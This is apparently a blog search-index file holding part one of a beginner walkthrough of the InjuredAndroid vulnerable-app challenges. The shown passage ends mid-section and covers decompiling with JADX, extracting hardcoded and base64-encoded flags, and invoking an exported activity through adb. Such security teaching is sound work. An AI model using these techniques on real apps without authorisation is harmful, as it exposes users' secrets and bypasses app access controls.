<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android application security part1</title>
    <url>/2021/11/20/Android-appsec-part-1/</url>
    <content><![CDATA[<p>This is a four part beginner series of Android application security using Vulnerable android application. The application used in the first three part series is a <code>InjuredAndroid</code> by <a href="https://twitter.com/B3nac">@B3nac</a>.</p>
 <span id="more"></span>

<p>The application covers different security concepts such as hardcoded secrets, weak cryptographic algorithms implementations, misconfiguration, webview vulnerabilities etc. The application can be downloaded from either provided links <a href="https://play.google.com/store/apps/details?id=b3nac.injuredandroid">playstore</a> or <a href="https://github.com/B3nac/InjuredAndroid">github</a>.</p>
<p>For solving the challenges you need to have an android phone or an emulator.</p>
<h2 id="Environment-setup"><a href="#Environment-setup" class="headerlink" title="Environment setup"></a>Environment setup</h2><p>For application installation to the emulator, use Android debug bridge(adb). <code>adb</code> is a set of command line tools which are installed as part of android studio that enables communication between emulator&#x2F;real android phone with the connected computer.</p>
<p>For Installation, run the command below in a terminal.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb <span class="token function">install</span> InjuredAndroid-1.0.12-release.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>After a successful installation of the application, the main Activity&#x2F;page looks like the image below.</p>
<p><img data-src="/images/android_injured.png" alt="Injured Android"></p>
<p>For static analysis of the application, List of the following tools is used throughout the series.</p>
<ol>
<li><a href="https://github.com/skylot/jadx">JADX</a></li>
<li>Text Editor (visual studio)</li>
<li>Android Studio</li>
</ol>
<p><code>JADX</code> is a bundle of command line and GUI tools that enables one to produce java source code from android Dex and APK files. It aids in decompiling the android application to java code which is more human readable &#x2F;friendly.</p>
<blockquote>
<p>NB: For reverse engineering&#x2F; code auditing of every application, you need to have a clear set of goal or objective of what you want to achieve. This helps narrow down the analysis and avoid many rabbit holes.</p>
</blockquote>
<h2 id="FLAG-ONE-LOGIN"><a href="#FLAG-ONE-LOGIN" class="headerlink" title="FLAG ONE - LOGIN"></a>FLAG ONE - LOGIN</h2><p><strong>Goal : Input the right flag.</strong></p>
<p>Objective of the first level is to get the correct flag. <strong>flag</strong> is a piece of reward if you do correct task you are asked to do. Looking at decompiled code in the editor as shown below, there is an interesting function called <strong>submitFlag</strong>. submit flag function is responsible for validation of user input.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">submitFlag</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">EditText</span> editText <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>editText2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m882d</span><span class="token punctuation">(</span>editText<span class="token punctuation">,</span> <span class="token string">"editText2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m885a</span><span class="token punctuation">(</span>editText<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"F1ag_0n3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token class-name">FlagOneSuccess</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">new</span> <span class="token class-name">FlagsOverview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4085J</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">new</span> <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4065b</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"flagOneButtonColor"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From code above, the <strong>FlagoneActivity</strong> class implements functionality where the user input is compared with hardcoded flag.</p>
<p>The user flag string is compared with hardcoded flag which is “<strong>F1ag_0n3</strong>“. The method <strong>m10785a</strong> compares the two objects (user input flag and hardcoded flag) and return a boolean depending on the result of the comparison of two objects. Result can either be true or false.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">m10785a</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span> obj2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> obj <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> obj2 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">:</span> obj<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>If the condition is True, new Intent is started which is <strong>FlagOneSuccess</strong>. Entering hardcoded flag as our input, we get a success message and color of <strong>Flag1</strong> in flagsOverview Activity changes to green, meaning challenge has been successfully been solved.</p>
<p><img data-src="/images/android/solved.png" alt="Flag one solved"></p>
<p>Level1 flag is “<strong>F1ag_0n3</strong>“.<br>For other levels if solved successfully, the color of the flag corresponding level will change to green.</p>
<h2 id="FLAG-TWO-EXPORTED-ACTIVITY"><a href="#FLAG-TWO-EXPORTED-ACTIVITY" class="headerlink" title="FLAG TWO - EXPORTED ACTIVITY"></a>FLAG TWO - EXPORTED ACTIVITY</h2><p>Goal : <strong>There is a way to bypass the main activity and invoke other activities that are exported.</strong></p>
<p><strong>What is an activity?</strong></p>
<p>An activity is a single focused thing that the user can do. It is an application component that provide a user interface for users to interact with.</p>
<p>Looking at the <strong>flagtwoactivity</strong>, the source code below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlagTwoActivity</span> <span class="token keyword">extends</span> <span class="token class-name">ActivityC0453c</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* renamed from: w */</span>
    <span class="token keyword">int</span> f4461w <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">/* renamed from: F */</span>
    <span class="token keyword">public</span> <span class="token comment">/* synthetic */</span> <span class="token keyword">void</span> <span class="token function">m4090F</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>f4461w<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Snackbar</span> <span class="token class-name">X</span> <span class="token operator">=</span> <span class="token class-name">Snackbar</span><span class="token punctuation">.</span><span class="token function">m2647X</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> <span class="token string">"Key words Activity and exported."</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">X</span><span class="token punctuation">.</span><span class="token function">m2646Y</span><span class="token punctuation">(</span><span class="token string">"Action"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">X</span><span class="token punctuation">.</span><span class="token function">mo2650N</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>f4461w<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Snackbar</span> X2 <span class="token operator">=</span> <span class="token class-name">Snackbar</span><span class="token punctuation">.</span><span class="token function">m2647X</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> <span class="token string">"Exported Activities can be accessed with adb or Drozer."</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            X2<span class="token punctuation">.</span><span class="token function">m2646Y</span><span class="token punctuation">(</span><span class="token string">"Action"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            X2<span class="token punctuation">.</span><span class="token function">mo2650N</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>f4461w <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/* access modifiers changed from: protected */</span>
    <span class="token annotation punctuation">@Override</span> <span class="token comment">// androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_flag_two<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">m8078C</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Toolbar</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>toolbar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">FloatingActionButton</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>fab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: b3nac.injuredandroid.d</span>
            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>
            <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">FlagTwoActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">m4090F</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The <strong>oncreate</strong> method is used for initializing the activity. The goal of the challenge is to invoke the <code>flagtwoactivity</code> from an external application. This activity is an <strong>exported activity</strong>, meaning it can be started outside the context of the application.</p>
<p>Activities in android are defined in <em>AndroidManifest.xml</em> .</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b3nac.injuredandroid.b25lActivity<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>As you see above, activity <strong>b3nac.injuredandroid.b25lActivity</strong> can be invoked by an external application because <strong>android:exported</strong> attribute is set to true.</p>
<p>For exploitation of the above issue we will use adb. First, we use adb to list installed packages and grep the application of our interest using grep utility.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:~$ adb shell pm list packages <span class="token operator">|</span> <span class="token function">grep</span> injuredandroid
package:b3nac.injuredandroid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>What happens when invoke b25lActivity class activity?</strong></p>
<p>When b25lActivity activity is invoked by an external application, it sets flag2 color to green in the FlagsOverview activity as illustrated in the code below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* loaded from: classes.dex */</span>
<span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> b25lActivity <span class="token keyword">extends</span> <span class="token class-name">ActivityC0453c</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* access modifiers changed from: protected */</span>
    <span class="token annotation punctuation">@Override</span> <span class="token comment">// androidx.appcompat.app.ActivityC0453c, androidx.fragment.app.ActivityC0797d, androidx.activity.ComponentActivity, androidx.core.app.ActivityC0714e, android.app.Activity</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_b25l<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">.</span>f4506j<span class="token punctuation">.</span><span class="token function">m4062a</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">FlagsOverview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4082M</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4065b</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"flagTwoButtonColor"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Invoke the activity b25lActivity using adb. Alternative method of invoking exported activities is by creating an android application thats starts the target&#96;s activity.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:~$ adb shell am start  -n b3nac.injuredandroid/.b25lActivity
Starting: Intent <span class="token punctuation">&#123;</span> <span class="token assign-left variable">cmp</span><span class="token operator">=</span>b3nac.injuredandroid/.b25lActivity <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>When activity two is started successfully through an external application, we are rewarded with a flag.</p>
<p><img data-src="/images/android/flag2.png" alt="Flag two"></p>
<h2 id="FLAG-THREE-RESOURCES"><a href="#FLAG-THREE-RESOURCES" class="headerlink" title="FLAG THREE - RESOURCES"></a>FLAG THREE - RESOURCES</h2><p><strong>Goal: Understanding how an application references Resources.</strong></p>
<p><strong>what are resources?</strong></p>
<p>Resources are used for defining colors, images, layouts, menus and string values. Everything defined in resources are referenced in application&#96;s code.</p>
<p>The decompiled code for FlagThreeActivity is shown below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">submitFlag</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">EditText</span> editText <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>editText2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m882d</span><span class="token punctuation">(</span>editText<span class="token punctuation">,</span> <span class="token string">"editText2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m885a</span><span class="token punctuation">(</span>editText<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getString</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>string<span class="token punctuation">.</span>cmVzb3VyY2VzX3lv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token class-name">FlagOneSuccess</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">FlagsOverview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4083L</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4065b</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"flagThreeButtonColor"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Looking at <strong>submitFlag</strong> function defined in <strong><em>FlagThreeActivity.java</em></strong>, the function is comparing user input with value referenced at Resource <strong><em>cmVzb3VyY2VzX3lv</em></strong> . R stands for resource.</p>
<p>Looking at strings we get flag as referenced by the string above.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>string <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"cmVzb3VyY2VzX3lv"</span><span class="token operator">></span>F1ag_thr3<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/string<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The flag is <strong>F1ag_thr33</strong></p>
<h2 id="FLAG-FOUR-LOGIN2"><a href="#FLAG-FOUR-LOGIN2" class="headerlink" title="FLAG FOUR - LOGIN2"></a>FLAG FOUR - LOGIN2</h2><p><strong>Goal: Get the right flag</strong></p>
<p>For flag four we analyze <strong>FlagFourActivity.java.</strong> activity. First is to figure out the logic implemented in the <code>submitflag</code> class.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">submitFlag</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">EditText</span> editText <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>editText2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m882d</span><span class="token punctuation">(</span>editText<span class="token punctuation">,</span> <span class="token string">"editText2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> obj <span class="token operator">=</span> editText<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1489g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4070a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m882d</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"decoder.getData()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m885a</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token class-name">C2759c</span><span class="token punctuation">.</span>f6854a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token class-name">FlagOneSuccess</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">FlagsOverview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4086I</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4065b</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"flagFourButtonColor"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The above decompiled code,we get user input and compare with bytes in variable <code>a</code>. To understand the logic we analyze the method <strong><em>c1489g</em></strong> and member class <strong><em>m4070a</em></strong>.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">C1489g</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* renamed from: a */</span>
    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> f4499a <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"NF9vdmVyZG9uZV9vbWVsZXRz"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* renamed from: a */</span>
    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">m4070a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>f4499a<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Public class <strong>c1489g</strong>, implements base64 decoding of the byte string and returns decoded string to <strong>submitFlag</strong> class.</p>
<p>For decoded string, use base64 linux utility.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">"NF9vdmVyZG9uZV9vbWVsZXRz"</span> <span class="token operator">|</span> base64 -d
4_overdone_omelets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Level 4 flag is <strong>4_overdone_omelets</strong></p>
<h2 id="FLAG-FIVE-EXPORTED-BROADCAST-RECEIVERS"><a href="#FLAG-FIVE-EXPORTED-BROADCAST-RECEIVERS" class="headerlink" title="FLAG FIVE - EXPORTED BROADCAST RECEIVERS"></a>FLAG FIVE - EXPORTED BROADCAST RECEIVERS</h2><p><strong>Goal:</strong> <strong>Understand how Broadcast receivers work</strong></p>
<p>An application receives broadcasts in two ways:</p>
<ol>
<li>Through manifest-declared receivers.</li>
<li>Context-registered receivers.</li>
</ol>
<p>Manifest-declared receivers - This causes the system to launch an application when broadcast is received. Searching in <code>AndroidManifest.xml</code> file we get where our broadcast is declared.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b3nac.injuredandroid.FlagFiveReceiver<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>theme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@style/AppTheme.NoActionBar<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@string/title_activity_flag_five<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b3nac.injuredandroid.FlagFiveActivity<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>In order to understand the Broadcast receivers, analyze <strong>oncreate()</strong> method in <strong>FlagFiveActivity.java</strong> file.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
